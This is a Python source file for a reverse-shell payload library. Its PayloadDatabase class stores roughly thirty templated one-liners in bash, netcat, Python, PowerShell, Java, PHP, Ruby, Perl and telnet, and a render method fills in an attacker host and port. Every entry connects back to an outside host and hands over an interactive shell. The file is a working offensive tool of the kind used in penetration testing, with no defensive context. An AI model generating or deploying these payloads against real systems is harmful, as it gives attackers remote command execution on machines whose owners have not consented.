from typing import Dict, Optional


class PayloadDatabase:
    _PAYLOADS: Dict[str, str] = {
        "python_socket": (
            "python3 -c 'import socket,os,pty;"
            "s=socket.socket();"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            "pty.spawn(\"/bin/bash\")'"
        ),
        "python_subprocess": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket();"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/bash\",\"-i\"])'"
        ),
        "python_thread": (
            "python3 -c '"
            "import socket,threading,subprocess;"
            "def h(s):\n"
            " while 1:\n"
            "  d=s.recv(1024).decode();\n"
            "  if not d:break\n"
            "  p=subprocess.Popen(d,shell=True,stdout=-1,stderr=-1,stdin=-1);\n"
            "  s.send(p.communicate()[0])\n"
            "s=socket.socket();"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "threading.Thread(target=h,args=(s,)).start()'"
        ),
        "python_ipv6": (
            "python3 -c 'import socket,os,pty;"
            "s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);"
            "s.connect((\"{LHOST}\",{LPORT},0,0));"
            "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            "pty.spawn(\"/bin/bash\")'"
        ),
        "bash_tcp": (
            "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
        ),
        "bash_tcp_nohup": (
            "nohup bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' &"
        ),
        "bash_udp": (
            "bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1"
        ),
        "bash_196": (
            "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196"
        ),
        "bash_5": (
            "exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; "
            "do $line 2>&5 >&5; done"
        ),
        "bash_readline": (
            "exec 5<>/dev/tcp/{LHOST}/{LPORT};"
            "while read line 0<&5;do $line 2>&5 >&5;done"
        ),
        "nc_traditional": (
            "nc -e /bin/bash {LHOST} {LPORT}"
        ),
        "nc_mkfifo": (
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
        ),
        "nc_nmap": (
            "ncat -e /bin/bash {LHOST} {LPORT}"
        ),
        "nc_udp": (
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc -u {LHOST} {LPORT} >/tmp/f"
        ),
        "nc_busybox": (
            "busybox nc {LHOST} {LPORT} -e bash"
        ),
        "powershell_tcp": (
            "$c=New-Object Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};" 
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){" 
            "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            "$sb=(iex $d 2>&1|Out-String);"
            "$sb2=$sb+'PS '+(pwd).Path+'> ';"
            "$bt=([text.encoding]::ASCII).GetBytes($sb2);"
            "$s.Write($bt,0,$bt.Length);$s.Flush()};" 
            "$c.Close()"
        ),
        "powershell_udp": (
            "$c=New-Object System.Net.Sockets.UdpClient;"
            "$c.Connect(\"{LHOST}\",{LPORT});"
            "$b=[System.Text.Encoding]::ASCII.GetBytes('cmd');"
            "$c.Send($b,$b.length);"
            "$r=$c.Receive([ref]$null);"
            "iex([System.Text.Encoding]::ASCII.GetString($r))"
        ),
        "powershell_ssl": (
            "$c=New-Object Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});"
            "$ssl=New-Object Net.Security.SslStream($c.GetStream(),$false,"
            "{$true});" # DÜZELTİLDİ
            "$ssl.AuthenticateAsClient(\"{LHOST}\");"
            "$r=New-Object IO.StreamReader($ssl);"
            "$w=New-Object IO.StreamWriter($ssl);"
            "$w.AutoFlush=$true;"
            "while(($d=$r.ReadLine()) -ne $null){$w.Write((iex $d|Out-String))}" 
        ),
        "java_runtime": (
            "r=Runtime.getRuntime();"
            "p=r.exec(new String[]{\"bash\",\"-c\"," 
            "\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5|while read l;do $l 2>&5 >&5;done\"});" 
            "p.waitFor()"
        ),
        "java_process": (
            "String[] cmd={\"bash\",\"-c\"," 
            "\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"};"
            "Runtime rt=Runtime.getRuntime();"
            "Process proc=rt.exec(cmd);proc.waitFor();"
        ),
        "php_exec": (
            "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
        ),
        "php_proc_open": (
            "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});"
            "$p=proc_open(\"/bin/bash\",array(0=>$s,1=>$s,2=>$s),$pipes);'"
        ),
        "php_shell_exec": (
            "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});"
            "while(!feof($s)){$c=fgets($s,1024);$o=shell_exec($c);" 
            "fputs($s,$o);}'"
        ),
        "php_pentestmonkey": (
            "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});"
            "exec(\"/bin/sh -i <&\".(int)$sock.\" >&\".(int)$sock.\" 2>&\".(int)$sock);'"
        ),
        "ruby_tcp": (
            "ruby -rsocket -e 'exit if fork;"
            "c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");"
            "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" 
        ),
        "ruby_bash": (
            "ruby -rsocket -e "
            "'c=TCPSocket.new(\"{LHOST}\",{LPORT});"
            "while(l=c.gets);IO.popen(l.chop,\"r\"){|f|c.print f.read}end'" 
        ),
        "ruby_no_fork": (
            "ruby -rsocket -e "
            "'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;"
            "exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
        "perl_tcp": (
            "perl -e 'use Socket;"
            "$i=\"{LHOST}\";$p={LPORT};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "connect(S,sockaddr_in($p,inet_aton($i)));"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            "exec(\"/bin/bash -i\");'"
        ),
        "perl_pty": (
            "perl -MIO -e "
            "'$c=new IO::Socket::INET(PeerAddr,\"{LHOST}:{LPORT}\");"
            "$~->fdopen($c,r);STDIN->fdopen($c,r);"
            "system $_ while<>;'"
        ),
        "telnet_mkfifo": (
            "rm /tmp/f;mkfifo /tmp/f;"
            "telnet {LHOST} {LPORT} 0</tmp/f | /bin/bash 1>/tmp/f"
        ),
        "telnet_chained": (
            "TF=$(mktemp -u);mkfifo $TF && telnet {LHOST} {LPORT} 0<$TF | "
            "/bin/bash 1>$TF"
        ),
    }

    @classmethod
    def get(cls, key: str) -> Optional[str]:
        return cls._PAYLOADS.get(key)

    @classmethod
    def get_all_keys(cls) -> list:
        return sorted(cls._PAYLOADS.keys())

    @classmethod
    def get_keys_by_language(cls, language: str) -> list:
        return sorted(k for k in cls._PAYLOADS if k.startswith(language.lower()))

    @classmethod
    def all_languages(cls) -> list:
        seen = set()
        langs = []
        for key in cls._PAYLOADS:
            lang = key.split('_')[0]
            if lang not in seen:
                seen.add(lang)
                langs.append(lang)
        return langs

    @classmethod
    def render(cls, key: str, lhost: str, lport: int) -> Optional[str]:
        template = cls.get(key)
        if template is None:
            return None

        return template.replace('{LHOST}', lhost).replace('{LPORT}', str(lport))
